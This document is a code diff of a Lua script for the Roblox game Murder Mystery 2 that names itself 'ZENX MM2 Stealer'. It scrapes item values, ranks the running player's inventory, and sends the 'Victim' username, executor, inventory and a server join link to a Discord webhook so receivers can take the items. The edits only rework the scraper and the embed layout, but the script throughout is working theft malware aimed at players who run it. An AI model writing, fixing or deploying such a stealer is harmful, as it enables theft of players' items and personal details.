@@ -18,7 +18,7 @@ if game.PlaceId ~= 142823291 then
     return
 end
 
--- Improved Value Scraper
+-- Value Scraper (fixed)
 local itemValues = {}
 local valuePages = {
     "https://supremevaluelist.com/mm2/godlies.html",
@@ -34,10 +34,10 @@ local function loadValues()
             if resp and resp.Body then
                 for nameBlock in resp.Body:gmatch("<h.-</div>") do
                     local name = nameBlock:match(">([^<]+)<")
-                    local valText = nameBlock:match("([%d,]+)")
-                    if name and valText then
+                    local val = nameBlock:match("([%d,]+)")
+                    if name and val then
                         local clean = name:match("^%s*(.-)%s*$"):lower()
-                        itemValues[clean] = tonumber(valText:gsub(",", ""))
+                        itemValues[clean] = tonumber(val:gsub(",", ""))
                     end
                 end
             end
@@ -73,30 +73,27 @@ end
 
 table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)
 
--- Discord
+-- Embed matching your screenshot
 local function postToDiscord()
     local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
     local displayLines = {}
     for i, item in ipairs(itemsToTrade) do
-        if i > 12 then break end
-        table.insert(displayLines, string.format("x%d %s → %d", item.qty, item.name, item.val))
+        if i > 10 then break end
+        table.insert(displayLines, item.name .. " x" .. item.qty)
     end
 
     local embed = {
-        content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone **BIG HIT**" or "**Small Hit**") .. " • Value: " .. string.format("%.0f", overallValue),
-        username = "ZENX MM2 Stealer",
+        username = "MM2 Stealer",
         embeds = {{
-            title = "🍪 ZENX | Murder Mystery 2 Hit",
-            color = 0xFF00FF,
+            title = "MM2 stealer",
             fields = {
-                {name = "Victim", value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")", inline = true},
-                {name = "Total Value", value = string.format("%.0f", overallValue), inline = true},
-                {name = "Rarity Breakdown", value = string.format("Godly:%d | Ancient:%d | Unique:%d | Vintage:%d", rarityCounts.Godly, rarityCounts.Ancient, rarityCounts.Unique, rarityCounts.Vintage), inline = false},
-                {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
-                {name = "Join Link", value = joinLink, inline = false},
+                {name = "Player Info:", value = "```Username: " .. LocalPlayer.Name .. "\nDisplay Username: " .. LocalPlayer.DisplayName .. "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\nReceiver: " .. table.concat(usernames, ", ") .. "```", inline = false},
+                {name = "Inventory", value = "```Total value: " .. string.format("%.2f", overallValue) .. "\nAncient     : " .. rarityCounts.Ancient .. "\nGodly       : " .. rarityCounts.Godly .. "\nUnique      : " .. rarityCounts.Unique .. "\nVintage     : " .. rarityCounts.Vintage .. "\nLegendary   : " .. rarityCounts.Legendary .. "\nRare        : " .. rarityCounts.Rare .. "\nUncommon    : " .. rarityCounts.Uncommon .. "\nCommon      : " .. rarityCounts.Common .. "```", inline = false},
+                {name = "List of items", value = "https://api.rubis.app/v2/scrap/" .. LocalPlayer.Name, inline = false},
+                {name = "Join link:", value = joinLink, inline = false},
             },
-            footer = {text = "ZENX HUB • Fixed Scraper"},
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            footer = {text = "best Stealer - " .. os.date("%Y-%m-%d %H:%M:%S")},
+            color = 0x00FF00
         }}
     }
 
@@ -155,4 +152,4 @@ for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 postToDiscord()
-print("✅ ZENX MM2 Stealer - Reverted Version Loaded")
+print("✅ ZENX MM2 Stealer - Embed Matched Your Screenshot")
